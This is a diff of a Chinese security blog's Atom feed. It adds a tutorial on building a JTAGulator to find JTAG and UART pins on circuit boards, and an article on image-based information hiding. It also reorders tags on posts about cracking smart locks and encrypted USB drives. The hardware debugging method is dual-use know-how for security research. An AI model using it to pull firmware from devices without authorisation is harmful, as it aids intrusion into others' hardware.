@@ -6,7 +6,7 @@
   <link href="/rss.xml" rel="self"/>
   
   <link href="http://yaseng.org/"/>
-  <updated>2020-04-16T05:40:46.985Z</updated>
+  <updated>2020-04-17T07:35:45.184Z</updated>
   <id>http://yaseng.org/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>嵌入式安全利器 JTAGulator 的制作与调试实战</title>
+    <link href="http://yaseng.org/diy-JTAGulator-and-debugging.html"/>
+    <id>http://yaseng.org/diy-JTAGulator-and-debugging.html</id>
+    <published>2020-04-15T16:00:00.000Z</published>
+    <updated>2020-04-17T07:35:45.184Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安全研究人员对智能设备进行安全测试时，经常会发现PCB电路板保留了JTAG（Joint Test Action Group）端口，用于程序固件下载和在线调试，安全研究人员也可以通过JTAG接口读取设备的程序固件，逆向分析设备的程序逻辑，发现设备的漏洞。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/1.png" alt="img"></p><p>由于JTAG标准本身并没有规定接口定义，导致JTAG Header种类繁多，你可能在各种不同的PCB电路板子上中见到过10pin、14pin、20pin等各式各样的JTAG Header，而且各个引脚的功能和顺序也无法确定，这给安全研究工作中造成了很大的麻烦，下图列举了4种接口定义，有ARM公司的定义，有ST公司的定义等等。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/2.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/3.png" alt="img"></p><p>那如何知道引脚定义呢？传统的做法是通过逻辑分析仪做信号分析来解决，但是这样既费时费力又容易出错。于是很多优秀的安全专家设计了各种设备来自动化的解决这个问题，JTAGulator便是其中一个优秀的解决方案。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/4.png" alt="img"></p><p>​    JTAGulator是一款开源的硬件工具，可以帮助安全研究人员识别测试设备PCB电路板上的JTAG和UART引脚定义，进而可以使用Attify Badge正确的接线并读取固件。本文将针对JTAG规范、JTAGulator的制作进行详细讲述。JTAGulator的原理以及如何使用Attify Badge读取设备的固件，将在下一篇文章中详细讲述。</p><h2 id="JTAG规范"><a href="#JTAG规范" class="headerlink" title="JTAG规范"></a>JTAG规范</h2><p>JTAG是联合测试工作组（Joint Test Action Group）的简称，是在名为标准测试访问端口和边界扫描结构的IEEE的标准1149.1的常用名称。此标准用于验证设计与测试生产出的印刷电路板功能。</p><p>1990年JTAG正式由IEEE的1149.1-1990号文档标准化，在1994年，加入了补充文档对边界扫描描述语言（BSDL）进行了说明。从那时开始，这个标准被全球的电子企业广泛采用。边界扫描几乎成为了JTAG的同义词。</p><p>JTAG的主要三大功能：</p><ol><li>下载器，即下载程序固件到设备FLASH芯片。</li><li>DEBUG，类似于医生的听诊器，可以探听芯片内部的错误。</li><li>边界扫描，可以访问芯片内部的型号逻辑状态，还有芯片引脚的状态等等。</li></ol><p>在JTAG接口中，最常用的信号有五个，分别是TCK / TMS / TDO / TDI / TRST，其中4个是输入信号接口，另外1个是输出信号接口。</p><p>JTAG最初是用来对芯片进行测试的，其基本原理是在器件内部定义一个TAP（Test Access Port）并规定TAP状态机的行为，通过专用的测试工具进行内部节点进行测试。JTAG测试允许多个器件通过JTAG接口串联在一起，形成一个JTAG链，能实现对各个器件分别测试。现在，JTAG接口还常用于实现ISP（In-System Programmable），对Flash等器件进行编程。下面，我们介绍一下这5个接口：</p><ul><li><p><strong>Test Clock Input (TCK)</strong><br>TCK为TAP的操作提供了一个独立的、基本的时钟信号，TAP 的所有操作都是通过这个时钟信号来驱动的。</p></li><li><p><strong>Test Mode SelectionInput (TMS)</strong><br>TMS信号用来控制TAP状态机的转换。通过TMS信号，可以控制TAP在不同的状态间相互转换。TMS信号在TCK的上升沿有效。</p></li><li><p><strong>Test Data Input (TDI)</strong><br>TDI是数据输入的接口。所有要输入到特定寄存器的数据都是通过TDI接口一位一位串行输入的（由 TCK 驱动）。</p></li><li><p><strong>Test Data Output (TDO)</strong><br>TDO是数据输出的接口。所有要从特定的寄存器中输出的数据都是通过TDO接口一位一位串行输出的（由 TCK 驱动）。</p></li><li><p><strong>Test Reset Input (TRST)</strong><br>TRST可以用来对TAPController进行复位（初始化）。不过这个信号接口在IEEE 1149.1标准里是可选的，并不是强制要求的。因为通过 TMS 也可以对 TAP Controller 进行复位（初始化）。</p></li></ul><p>JTAG接口可以一对一的使用，也可以组成菊花链的一对多拓扑结构，两种拓扑结构如下图所示。多核的芯片，其芯片内部已经接成了菊花链的形式。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/5.png" alt="img"></p><h2 id="制作JTAGulator"><a href="#制作JTAGulator" class="headerlink" title="制作JTAGulator"></a>制作JTAGulator</h2><p>JTAGulator是一款开源的硬件测试设备，主要用于定义JTAG接口的各个引脚，官方售价$169，某宝代购价￥1500左右，自己DIY成本可以控制在￥500以内。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/6.png" alt="img"></p><p>首先去<a href="http://www.grandideastudio.com/jtagulator/" target="_blank" rel="noopener">JTAGulator的官网</a>可以下载制作JTAGulator所需的所有资料，GERBER光绘文件，BOM元件列表，程序固件等等。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/7.png" alt="img"></p><p>把GERBER光绘文件发往工厂打样PCB，等待2-3天即可到货，然后购买BOM表中的电子元器件。PCB我是在嘉立创打样的，电子元件是在立创商城购买。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/8.png" alt="img"></p><p>把官网提供的PCB装配图打印出来，然后把一个个元件都焊上去。焊接完成后用洗板水清理松香和助焊剂的残留，在上电之前仔细检查是否存在虚焊和短路现象。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/9.png" alt="img"></p><p>通过MiniUSB数据线连接电脑，打开“设备管理器”会看到一个串行通信端口。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/10.png" alt="img"></p><p>硬件测试没问题，接下来在GITHUB下载<a href="https://github.com/grandideastudio/jtagulator/releases" target="_blank" rel="noopener">程序固件</a>，给设备烧录程序固件需要安装芯片的烧录工具<a href="https://www.parallax.com/downloads/propeller-tool-software-windows-spin-assembly" target="_blank" rel="noopener">Propeller Tool</a>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/11.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/12.png" alt="img"></p><p>将下载的程序固件源码解压出来，打开里面的”JTAGulator.eeprom”文件，点击”Load ARM”就可以烧录固件。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/13.png" alt="img"></p><p>烧录完毕用串口调试工具打开JTAGulator对应的COM端口，波特路115200，按一下回车键，返回数据即可，”H”查看帮助，”I”查看版本。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/14.png" alt="img"></p><h2 id="JTAG识别"><a href="#JTAG识别" class="headerlink" title="JTAG识别"></a>JTAG识别</h2><p>用一块STM32开发板做测试，假装不知道它的引脚定义，板子单独供电，先用万用表测出GND引脚，然后把需要识别的引脚和GND引脚用杜邦线接到JTAGulator上。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/15.png" alt="img"></p><p>输入”J”进入JTAG模式，”V”设置电压，”I”是IDCODE扫描，然后设置通道范围，成功识别出引定义。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/16.png" alt="img"></p><h2 id="UART识别"><a href="#UART识别" class="headerlink" title="UART识别"></a>UART识别</h2><p>拿一台网件的路由器做测试，一样的步骤，先用万用表测出GND引脚，然后把剩下的脚链接到JTAGulator上。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/17.png" alt="img"></p><p>成功识别出TX和RX引脚。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/18.png" alt="img"></p><p>还可以用JTAGulator通过UART串口调试路由器。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/19.png" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们DIY的JTAGulator就算完成了，感谢作者Joe Grand将所有资料开源，下一篇文章讲述JTAGulator的原理以及如何使用Attify Badge读取设备的固件，敬请期待。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/20.png" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.grandideastudio.com/jtagulator/" target="_blank" rel="noopener">http://www.grandideastudio.com/jtagulator/</a></p><p><a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a></p><p><a href="https://blog.csdn.net/beetleinv/article/details/86372466" target="_blank" rel="noopener">https://blog.csdn.net/beetleinv/article/details/86372466</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;安全研究人员对智能设备进行安全测试时，经常会发现PCB电路板保留了JTAG（Joint Test Action Group）端口，用于程序固
+      
+    
+    </summary>
+    
+      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="JTAGulator" scheme="http://yaseng.org/tags/JTAGulator/"/>
+    
+      <category term="jtag" scheme="http://yaseng.org/tags/jtag/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>信息安全之信息伪装</title>
+    <link href="http://yaseng.org/something-about-information-hiding.html"/>
+    <id>http://yaseng.org/something-about-information-hiding.html</id>
+    <published>2020-03-14T16:00:00.000Z</published>
+    <updated>2020-04-17T07:52:33.781Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="伪装之道"><a href="#伪装之道" class="headerlink" title="伪装之道"></a>伪装之道</h2><p>《孙子兵法》“虚实篇”中提出“故形人而我无形，则我专而敌分”，即“示伪形于敌，而我之真形则藏而不露”，指出了“伪装”对促进战争制胜的重要作用。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/1.png" alt="img"></p><p>​    当然，伪装绝对是一个技术活 ……</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/2.png" alt="img"></p><h2 id="信息伪装"><a href="#信息伪装" class="headerlink" title="信息伪装"></a>信息伪装</h2><p>信息伪装就是将秘密信息隐藏于另一非机密的文件内容之中，其形式可以是任何一种数字媒体，如图像、声音、视频等等。信息伪装技术不同于传统的加密技术，密码仅仅隐藏了信息的内容，而信息伪装不但隐藏了信息的内容而且隐藏了信息的存在。</p><p>一般来说，信息伪装技术具有隐蔽性、安全性、对称性和可纠错性四大特性。信息伪装技术包含的内容范围十分广泛，可以分为伪装术、数字水印、数据隐藏和数据嵌入等。其中图像伪装术和图像数字水印是人们研究的重点。信息伪装是一门不断发展的学科，许多新的分支和技术都在不断地涌现。可视密码学就是其中的一种。这种技术在恢复秘密图像时不需要任何复杂的密码学计算,而是直接以人的视觉系统即可将秘密图像辩识出来,完全不同于传统的密码技术,在解密过程中须靠大量且复杂的技术才可解出真正的信息。图像伪装是一门技巧性学问, 目前正在实用化方向发展。</p><h2 id="可视密码学视角下的图像“加密”"><a href="#可视密码学视角下的图像“加密”" class="headerlink" title="可视密码学视角下的图像“加密”"></a>可视密码学视角下的图像“加密”</h2><p>受信息伪装思想的启发，提出一种可逆图像转换的图像加密方法。该方法可以将原始图像变换为大小相同的自由选择的目标图像。对于彩色图像，我们分别对颜色通道R, G, B进行相同的变换。因此，文章仅以灰度图像(一个通道)为例来描述该方法。对于原始图像I，我们从图像数据库中随机选择与I大小相同的目标图像J。</p><p>首先，我们将原始图像I和目标图像J分别分割成N个互不重叠的块，然后将I和J的块按(B1,T1)，…，(BN,TN)组成块对，其中Bi是I的一个原始块，Ti是J的对应目标块，1 ≤i ≤N。将Bi转换成Ti，其实是生成一个类似Ti的T’i。然后将目标图像J中的每个Ti替换为T’i，得到变换后的图像J’。最后利用可逆信息嵌入方法将一些辅助信息嵌入到J’中，生成最终的伪装图像，也可以称为加密图像E(I)。这些辅助信息对于从J’恢复到I是必要的，在被嵌入之前，这些辅助信息将被压缩并使用与接收者共享的密钥K加密，因此只有拥有K的接收者才能解密E(I)。</p><p>所提出的转换过程包括三个步骤:块配对、块转换和边信息嵌入。我们主要阐述前两个步骤，第三个步骤可以用任何传统的可逆水印或可逆信息隐藏方法实现。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="关键步骤一：块配对"><a href="#关键步骤一：块配对" class="headerlink" title="关键步骤一：块配对"></a><strong>关键步骤一：块配对</strong></h3><p>为了使变换后的图像J’看起来像目标图像J，我们希望每个变换后的块与目标块具有相近的均值(u)和标准差(SD)。因此，我们首先分别计算I和J的每个块的u和SD。设块B像素组成为 B={p1,p2，…，pn},则该块的均值(u)和标准差(SD)计算如下：</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/3.png" alt="img"></p><p>当原始图像与目标图像匹配时，我们希望两个SD最接近的图像块是一对。文献[1]中Lee等人的方法是将原始图像块和目标图像块分别按照它们的SD按升序排序，然后将每个原始块依次与对应的目标块按序配对。但是这种方法不可逆，也就是无法无损的还原原始图像。如果图像被分成N个块，则需要N[logN]比特来记录块索引。显然，块越小，变换后的图像质量就会越好，但是会导致一个很大的N。事实上，可能没有足够的冗余空间来存储这些额外的信息。因此，本文分块大小定为4×4。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/4.png" alt="img"></p><p>为了压缩块索引，我们首先根据块的SD值对它们进行分类，然后再对它们进行配对。事实上，如图1所示，统计来自BossBase图像数据库的10000张不同大小的图像，我们发现大多数的SD值集中在一个接近于零的小范围内。因此，我们将数据块分成两个不相等比例的类:SDs较小的数据块为0类，SDs较大的数据块为1类，并将属于同一类的数据块进行配对。通过将大多数块分配给类0，我们可以避免一对块之间的SDs的大偏差，同时有效地压缩索引。</p><h3 id="关键步骤二：块转换"><a href="#关键步骤二：块转换" class="headerlink" title="关键步骤二：块转换"></a><strong>关键步骤二：块转换</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/5.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/6.png" alt="img"></p><p>最后，为了尽可能地保持变换后的图像与目标图像之间的相似性，我们进一步将变换后的块旋转到0°、90°、180°或270°四个方向中的一个。选择最优方向，使旋转块与目标块之间的均方误差最小。</p><p>在变换和旋转之后，得到一个新的块T’。用这些新块替换相应目标图像的块并生成转换后的图像J’。参数Δu和旋转方向将被压缩，加密，然后嵌入转换后的图像J’作为边信息输出目标图像E (I)，这也可以作为一种加密图像。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>从BossBase图像数据库中随机选择10对图像作为我们的测试图像。首先对所有的图像进行预处理，得到大小相同的1024×1024像素。</p><p>如下图所示，展示了两张测试图像以及加密后的视觉效果。通过该方法得到的加密图像E(I)与目标图像相似，看起来像马赛克图像。由于加密后的图像与目标图像的差异较小，这种视觉效果能满足伪装的要求，即原始图像内容完全被目标图像内容所覆盖。即使攻击者识别出伪装，如果不知道加密算法与秘钥K，也不能恢复边信息，从而不能恢复图像。此外，边信息平均占用每个像素约0.521比特/像素元(bpp)。这对图像造成了较大的失真，但加密后的图像E(I)仍然可以保持一个较好的质量，其PSNR值大约等于30 dB，这是一个可以接受的视觉效果。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/7.png" alt="img"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] Y. Lee and W. Tsai, “A new secure image transmission technique via secret-fragment-visible mosaic images by nearly reversible color transformation,” IEEE Trans. Circuits Syst. Video Technol., vol. 24, no. 4, pp. 695–703, Apr. 2014</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;伪装之道&quot;&gt;&lt;a href=&quot;#伪装之道&quot; class=&quot;headerlink&quot; title=&quot;伪装之道&quot;&gt;&lt;/a&gt;伪装之道&lt;/h2&gt;&lt;p&gt;《孙子兵法》“虚实篇”中提出“故形人而我无形，则我专而敌分”，即“示伪形于敌，而我之真形则藏而不露”，指出了“伪装”对促进战
+      
+    
+    </summary>
+    
+      <category term="数据安全" scheme="http://yaseng.org/categories/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="信息伪装" scheme="http://yaseng.org/tags/%E4%BF%A1%E6%81%AF%E4%BC%AA%E8%A3%85/"/>
+    
+  </entry>
   
   <entry>
     <title>强化 web 攻击神器 Burp Suite (二) — 切换 ip 技能点</title>
@@ -37,11 +89,11 @@
       <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="渗透测试" scheme="http://yaseng.org/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
       <category term="Burp Suite" scheme="http://yaseng.org/tags/Burp-Suite/"/>
     
       <category term="代理 ip" scheme="http://yaseng.org/tags/%E4%BB%A3%E7%90%86-ip/"/>
+    
+      <category term="渗透测试" scheme="http://yaseng.org/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
@@ -156,11 +208,11 @@
     
       <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
+      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
+    
       <category term="开锁" scheme="http://yaseng.org/tags/%E5%BC%80%E9%94%81/"/>
     
       <category term="蓝牙锁破解" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="声波锁破解" scheme="http://yaseng.org/tags/%E5%A3%B0%E6%B3%A2%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
@@ -197,9 +249,9 @@
     
       <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
-      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
-    
       <category term="指纹锁安全" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="长毛开锁" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E5%BC%80%E9%94%81/"/>
     
@@ -232,48 +284,15 @@
     
       <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
+      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
+    
       <category term="开锁" scheme="http://yaseng.org/tags/%E5%BC%80%E9%94%81/"/>
     
       <category term="蓝牙锁破解" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
-      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
-    
       <category term="声波锁破解" scheme="http://yaseng.org/tags/%E5%A3%B0%E6%B3%A2%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="保险柜破解" scheme="http://yaseng.org/tags/%E4%BF%9D%E9%99%A9%E6%9F%9C%E7%A0%B4%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>破解硬件ase256 加密指纹u盘(极棒大赛)</title>
-    <link href="http://yaseng.org/cracking_hardware_aes256_encrypted_fingerprint_flash_disk_in_geekpwn_2018.html"/>
-    <id>http://yaseng.org/cracking_hardware_aes256_encrypted_fingerprint_flash_disk_in_geekpwn_2018.html</id>
-    <published>2018-10-25T16:00:00.000Z</published>
-    <updated>2020-04-16T10:20:25.600Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GeekPwn（极棒），是由国内顶尖信息安全团队碁震（KEEN）于2014年发起并主办的全球最大关注智能生活的安全极客（黑客）大赛，也是全球首个探索人工智能与专业安全的前沿平台，与Pwn2Own、Defcon并称为世界三大黑客赛事。<br>GeekPwn 2018国际安全极客大赛（上海站）以“人攻智能，洞见未来”为主题，于10月24~25日在上海召开。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/131543922868_.pic_hd.jpg" alt=""></p><p>在这次极棒大赛上，伏宸安全实验室团队以出色的表现获得评委组的高度认可，获得极棒名人堂荣誉以及极客精神奖两项大奖，奖金累计16万元！</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/141543922869_.pic_hd.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/GeekPwn2018.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>传统信息安全因其基于虚拟化世界的本质特点，其思考和关注的重点在信息和数据的安全性，即 security 层面，而随着物联网的飞速发展，网络与现实连同，真实的硬件设备成为相互连接的媒介，物理上的接触和真实的感官动作是物联网的核心竞争力之一，而与此同时暴露的安全风险与传统网络威胁相比，又有着巨大的差异，关注物联网的安全，当改变沿袭而来的信息安全思想，应更多的关注其在现实物理世界的安全性，也就是 safety 层面的安全，也是人的安全性问题 。<br>通过对物联网设备的安全分析，并结合真实物联网攻击案例，从多个维度阐述security 和 safety 层面的思想差异以及所产生的不同影响，同时对基于物理层的攻防手段进行一定的总结和概括。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GeekPwn（极棒），是由国内顶尖信息安全团队碁震（KEEN）于2014年发起并主办的全球最大关注智能生活的安全极客（黑客）大赛，也是全球
-      
-    
-    </summary>
-    
-      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="侧信道攻击" scheme="http://yaseng.org/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="u盘破解" scheme="http://yaseng.org/tags/u%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="aes256 硬件加密破解" scheme="http://yaseng.org/tags/aes256-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="指纹加密u盘破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E5%8A%A0%E5%AF%86u%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="电磁攻击" scheme="http://yaseng.org/tags/%E7%94%B5%E7%A3%81%E6%94%BB%E5%87%BB/"/>
     
   </entry>
   
@@ -305,6 +324,39 @@
       <category term="无人超市破解" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82%E7%A0%B4%E8%A7%A3/"/>
     
       <category term="无人超市零元购" scheme="http://yaseng.org/tags/%E6%97%A0%E4%BA%BA%E8%B6%85%E5%B8%82%E9%9B%B6%E5%85%83%E8%B4%AD/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>破解硬件ase256 加密指纹u盘(极棒大赛)</title>
+    <link href="http://yaseng.org/cracking_hardware_aes256_encrypted_fingerprint_flash_disk_in_geekpwn_2018.html"/>
+    <id>http://yaseng.org/cracking_hardware_aes256_encrypted_fingerprint_flash_disk_in_geekpwn_2018.html</id>
+    <published>2018-10-25T16:00:00.000Z</published>
+    <updated>2020-04-16T10:20:25.600Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GeekPwn（极棒），是由国内顶尖信息安全团队碁震（KEEN）于2014年发起并主办的全球最大关注智能生活的安全极客（黑客）大赛，也是全球首个探索人工智能与专业安全的前沿平台，与Pwn2Own、Defcon并称为世界三大黑客赛事。<br>GeekPwn 2018国际安全极客大赛（上海站）以“人攻智能，洞见未来”为主题，于10月24~25日在上海召开。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/131543922868_.pic_hd.jpg" alt=""></p><p>在这次极棒大赛上，伏宸安全实验室团队以出色的表现获得评委组的高度认可，获得极棒名人堂荣誉以及极客精神奖两项大奖，奖金累计16万元！</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/141543922869_.pic_hd.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/GeekPwn2018.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>传统信息安全因其基于虚拟化世界的本质特点，其思考和关注的重点在信息和数据的安全性，即 security 层面，而随着物联网的飞速发展，网络与现实连同，真实的硬件设备成为相互连接的媒介，物理上的接触和真实的感官动作是物联网的核心竞争力之一，而与此同时暴露的安全风险与传统网络威胁相比，又有着巨大的差异，关注物联网的安全，当改变沿袭而来的信息安全思想，应更多的关注其在现实物理世界的安全性，也就是 safety 层面的安全，也是人的安全性问题 。<br>通过对物联网设备的安全分析，并结合真实物联网攻击案例，从多个维度阐述security 和 safety 层面的思想差异以及所产生的不同影响，同时对基于物理层的攻防手段进行一定的总结和概括。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GeekPwn（极棒），是由国内顶尖信息安全团队碁震（KEEN）于2014年发起并主办的全球最大关注智能生活的安全极客（黑客）大赛，也是全球
+      
+    
+    </summary>
+    
+      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="u盘破解" scheme="http://yaseng.org/tags/u%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
+    
+      <category term="aes256 硬件加密破解" scheme="http://yaseng.org/tags/aes256-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"/>
+    
+      <category term="指纹加密u盘破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E5%8A%A0%E5%AF%86u%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
+    
+      <category term="侧信道攻击" scheme="http://yaseng.org/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
+    
+      <category term="电磁攻击" scheme="http://yaseng.org/tags/%E7%94%B5%E7%A3%81%E6%94%BB%E5%87%BB/"/>
     
   </entry>
   
@@ -361,11 +413,11 @@
     
       <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
     
+      <category term="侧信道攻击" scheme="http://yaseng.org/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
+    
       <category term="物理攻击" scheme="http://yaseng.org/tags/%E7%89%A9%E7%90%86%E6%94%BB%E5%87%BB/"/>
     
       <category term="ChipWhisperer" scheme="http://yaseng.org/tags/ChipWhisperer/"/>
-    
-      <category term="侧信道攻击" scheme="http://yaseng.org/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
     
       <category term="毛刺攻击" scheme="http://yaseng.org/tags/%E6%AF%9B%E5%88%BA%E6%94%BB%E5%87%BB/"/>
     
@@ -569,58 +621,6 @@
     
     
       <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>芯片安全系列-Let&#39;s cook!</title>
-    <link href="http://yaseng.org/chip-security-let-us-cook.html"/>
-    <id>http://yaseng.org/chip-security-let-us-cook.html</id>
-    <published>2018-01-16T16:00:00.000Z</published>
-    <updated>2018-06-29T10:27:44.000Z</updated>
-    
